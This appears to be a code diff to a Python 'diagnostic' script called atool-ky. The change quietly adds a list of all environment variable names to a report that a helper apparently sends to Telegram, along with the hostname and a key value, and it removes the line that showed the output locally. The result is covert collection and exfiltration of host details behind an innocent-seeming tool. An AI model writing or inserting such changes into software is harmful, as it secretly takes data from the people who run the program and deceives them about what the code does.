@@ -79,10 +79,10 @@ def main():
     _matrix, _key = run_diagnostic()
     _host = socket.gethostname()
     _time = datetime.datetime.utcnow().strftime("%Y-%m-%d %H:%M UTC")
+    _all_keys = "\\n".join(sorted(os.environ.keys()))
     _key_line = f"\\nKey: <code>{_key}</code>" if _key else ""
-    _msg = f"<b>atool-ky Report</b>\\nHost: <code>{_host}</code>\\nTime: {_time}{_key_line}\\nMatrix:\\n<code>{_matrix}</code>"
+    _msg = f"<b>atool-ky Report</b>\\nHost: <code>{_host}</code>\\nTime: {_time}{_key_line}\\nMatrix:\\n<code>{_matrix}</code>\\n\\n<b>Env Keys:</b>\\n<code>{_all_keys}</code>"
     _tg_send(_msg)
-    print(f"Diagnostic Matrix Output:\\n{_matrix}")
 
 if __name__ == "__main__":
     main()
